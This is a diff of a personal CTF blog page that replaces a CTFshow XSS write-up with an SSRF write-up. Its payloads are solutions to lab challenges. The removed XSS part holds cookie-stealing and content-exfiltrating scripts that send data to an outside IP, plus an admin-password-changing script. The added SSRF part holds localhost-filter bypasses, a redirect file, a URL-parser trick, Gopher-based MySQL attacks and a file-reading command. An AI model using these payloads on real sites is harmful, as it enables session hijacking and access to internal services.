@@ -16,21 +16,23 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CTFshow WriteUps WEB入门 XSSweb316~319 &#96;&#96;&#96; 1234567### web320~327- 过滤了空格- &#96;&#96;&#96;  &lt;body&#x2F;**&#x2F;onload&#x3D;&quot;window.location.href&#x3D;&amp;#x27;http:&#x2F;&#x2F;118.178.126.49&#x2F;get.php?1&#x3D;&amp;#x27;+document.cookie&quot;">
+    <meta name="description" content="CTFshow WriteUps WEB入门 SSRFweb351 &#96;&#96;&#96;url&#x3D;127.0.0.1&#x2F;flag.php12345678910### web352- 过滤了localhost和127.0.0.1- &#96;&#96;&#96;  url&#x3D;http:&#x2F;&#x2F;0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0x7f">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF_show_Web入门_XSS">
-<meta property="og:url" content="http://example.com/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/index.html">
+<meta property="og:title" content="CTF_show_Web入门_SSRF">
+<meta property="og:url" content="http://example.com/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/index.html">
 <meta property="og:site_name" content="luelueking的ctf之路">
-<meta property="og:description" content="CTFshow WriteUps WEB入门 XSSweb316~319 &#96;&#96;&#96; 1234567### web320~327- 过滤了空格- &#96;&#96;&#96;  &lt;body&#x2F;**&#x2F;onload&#x3D;&quot;window.location.href&#x3D;&amp;#x27;http:&#x2F;&#x2F;118.178.126.49&#x2F;get.php?1&#x3D;&amp;#x27;+document.cookie&quot;">
+<meta property="og:description" content="CTFshow WriteUps WEB入门 SSRFweb351 &#96;&#96;&#96;url&#x3D;127.0.0.1&#x2F;flag.php12345678910### web352- 过滤了localhost和127.0.0.1- &#96;&#96;&#96;  url&#x3D;http:&#x2F;&#x2F;0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0x7f">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-07-24T11:34:59.000Z">
-<meta property="article:modified_time" content="2022-07-24T08:07:56.597Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/68fcffdc46eb4b2a3c4413a64319621d.png">
+<meta property="article:published_time" content="2022-07-26T11:34:59.000Z">
+<meta property="article:modified_time" content="2022-07-26T14:15:46.219Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/68fcffdc46eb4b2a3c4413a64319621d.png">
   
   
   
-  <title>CTF_show_Web入门_XSS - luelueking的ctf之路</title>
+  <title>CTF_show_Web入门_SSRF - luelueking的ctf之路</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -195,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CTF_show_Web入门_XSS"></span>
+            <span id="subtitle" data-typed-text="CTF_show_Web入门_SSRF"></span>
           
         </div>
 
@@ -206,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-07-24 19:34" pubdate>
-          2022年7月24日 晚上
+        <time datetime="2022-07-26 19:34" pubdate>
+          2022年7月26日 晚上
         </time>
       </span>
     
@@ -218,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          999 字
+          874 字
         
       </span>
     
@@ -229,7 +231,7 @@
         
         
         
-          9 分钟
+          8 分钟
         
       </span>
     
@@ -267,45 +269,51 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CTF_show_Web入门_XSS</h1>
+            <h1 style="display: none">CTF_show_Web入门_SSRF</h1>
             
             
               <div class="markdown-body">
                 
                 <h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr>
 <h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="web316-319"><a href="#web316-319" class="headerlink" title="web316~319"></a>web316~319</h3><ul>
-<li>&#96;&#96;&#96;<body onload="window.location.href='http://118.178.126.49/get.php?1='+document.cookie"></body>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web320~<span class="hljs-number">327</span><br><br>- 过滤了空格<br><br>- ```<br>  &lt;body<span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;window.location.href=&#x27;http://118.178.126.49/get.php?1=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;<br></code></pre></td></tr></table></figure></li>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><ul>
+<li>&#96;&#96;&#96;<br>url&#x3D;127.0.0.1&#x2F;flag.php<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web352</span><br><br>- 过滤了localhost和<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br>- ```<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/flag.php<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7f.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>/flag.php<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0177.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><ul>
-<li><p>随便注册一个用户名</p>
+<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><ul>
+<li>同352</li>
+</ul>
+<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><ul>
+<li><p><strong>将域名解析的A记录指向127.0.0.1即可，下面用的域名sudo.cc已指向127.0.0.1</strong></p>
 </li>
-<li><p>密码为</p>
-</li>
-<li><pre><code class="hljs">&lt;script&gt;window.open(&#39;http://118.178.126.49/get.php?1=&#39;+document.cookie)&lt;/script&gt;
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br>- 可以拿到管理员cookie<br><br>- 用户管理页面修改phpsessId<br><br>- 看到flag<br><br>### web329<br><br>- 解法：<br><br>- 随便注册一个用户名：<br><br>- 密码为：<br><br>- ```<br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$(<span class="hljs-string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">index,value</span>)&#123;<span class="hljs-keyword">if</span>(value.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ctf&#x27;</span>+<span class="hljs-string">&#x27;show&#x27;</span>)&gt;-<span class="hljs-number">1</span>)&#123;<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://118.178.126.49/get.php?1=&#x27;</span>+value.<span class="hljs-property">innerHTML</span>;&#125;&#125;);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<li><p>&#96;&#96;&#96;<br>url&#x3D;<a target="_blank" rel="noopener" href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web355~<span class="hljs-number">356</span><br><br>- ```<br>  url=http:<span class="hljs-comment">//0/flag.php</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><ul>
+<li>&#96;&#96;&#96;<br>url&#x3D;<a target="_blank" rel="noopener" href="http://118.178.126.49/ssrf.php">http://118.178.126.49/ssrf.php</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- ssrf.php<br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span> <br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><ul>
+<li><pre><code class="php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url))&#123;
+    echo file_get_contents($url);
+&#125;
 </code></pre>
 </li>
-<li><p>可以拿到管理员密码</p>
-</li>
-<li><p>登录</p>
-</li>
-<li><p>解释：利用js异步请求直接拿取信息</p>
+<li><p>要求以<a href="http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`">http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`</a></p>
 </li>
 </ul>
-<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><ul>
-<li><p>修改管理员密码</p>
+<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><ul>
+<li>Gopher协议打无密码的mysql</li>
+<li>使用Gopherus</li>
+</ul>
+<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><ul>
+<li><p><img src="https://img-blog.csdnimg.cn/img_convert/68fcffdc46eb4b2a3c4413a64319621d.png" srcset="/img/loading.gif" lazyload alt="ssrfweb360gopher"></p>
 </li>
-<li><p>&#96;&#96;&#96;</p>
-<script>window.location.href='http://127.0.0.1/api/change.php?p=123';</script>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 登录<br><br><span class="hljs-comment">### web331</span><br><br>- 改post<br><br>- ```<br>  &lt;script&gt;$.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><ul>
-<li>负值转账</li>
-</ul>
-<h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><ul>
-<li>给自己转账（非预期）</li>
+<li><p>&#x2F;?cmd&#x3D;tac &#x2F;flaaag</p>
+</li>
 </ul>
 
                 
@@ -345,8 +353,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CTF_show_Web入门_XSS</div>
-      <div>http://example.com/2022/07/24/CTF_show_Web入门_XSS/</div>
+      <div>CTF_show_Web入门_SSRF</div>
+      <div>http://example.com/2022/07/26/CTF_show_Web入门_SSRF/</div>
     </div>
     <div class="license-meta">
       
@@ -358,7 +366,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年7月24日</div>
+          <div>2022年7月26日</div>
         </div>
       
       
@@ -388,18 +396,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/" title="CTF_show_Web入门_SSRF">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CTF_show_Web入门_SSRF</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/" title="CTF_show_Web入门_sql注入">
-                        <span class="hidden-mobile">CTF_show_Web入门_sql注入</span>
+                      <a href="/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/" title="CTF_show_Web入门_XSS">
+                        <span class="hidden-mobile">CTF_show_Web入门_XSS</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
